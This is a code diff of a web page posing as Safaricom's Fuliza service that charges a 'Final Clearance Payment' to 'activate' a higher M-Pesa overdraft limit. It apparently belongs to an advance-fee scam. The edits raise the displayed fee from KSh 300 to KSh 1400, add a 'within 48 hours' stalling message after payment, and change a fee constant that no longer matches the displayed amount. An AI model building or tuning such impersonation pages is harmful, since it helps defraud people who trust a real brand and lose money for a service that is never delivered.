@@ -111,7 +111,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 </head>  
 <body>  <canvas id="confettiCanvas"></canvas>
 
-<header class="top-bar">Safaricom Fuliza — Final Step 4 of 4</header>  <div class="page-wrap">    <div class="step-badge">  
+<header class="top-bar">Safaricom Fuliza — Final Step 4</header>  <div class="page-wrap">    <div class="step-badge">  
     <div class="step-dot">4</div>  
     <div class="step-line"></div>  
     <div class="step-label">Final Clearance Payment</div>  
@@ -124,7 +124,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
       <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>  
       <div class="invoice-amount-row">  
         <div class="invoice-currency">KSh</div>  
-        <div class="invoice-amount">300</div>  
+        <div class="invoice-amount">1400</div>  
         <div class="invoice-label">Amount Due</div>  
       </div>  
     </div>  <div class="checklist">  
@@ -162,7 +162,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 </div>  
 <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>  
 
-<button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 300 &amp; Activate Limit</button>  
+<button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1400 &amp; Activate Limit</button>  
 
 <div class="spinner" id="spinner">  
   <div class="loader"></div>  
@@ -190,7 +190,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
     <div class="success-banner">  
       <span class="big-emoji">🏆</span>  
       <h3>Congratulations!</h3>  
-      <p>Your Fuliza limit has been successfully upgraded to<br><strong style="font-size:18px;">KSh <span id="rNewLimit">—</span></strong>.<br>Your new limit is now active on your M-Pesa account.</p>  
+      <p>Your Fuliza limit has been successfully upgraded to<br><strong style="font-size:18px;">KSh <span id="rNewLimit">—</span></strong>.<br>Your new limit would be upgraded within 48 hours, Make sure your M-Pesa account is active.</p>  
     </div>  
     <div class="purpose-note" style="margin-top:16px;">  
       All 4 steps completed — clearance fee received and Fuliza limit is now active. Check your Fuliza balance on M-Pesa to confirm your new limit.  
@@ -221,7 +221,7 @@ const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 document.getElementById("limit").innerText = selectedAmount;  
 document.getElementById("limitInNote").innerText = selectedAmount;  
   
-const CLEARANCE_FEE = 15;  
+const CLEARANCE_FEE = 12;  
   
 const phoneInput  = document.getElementById("phone");  
 const phoneWrap   = document.getElementById("phoneWrap");  
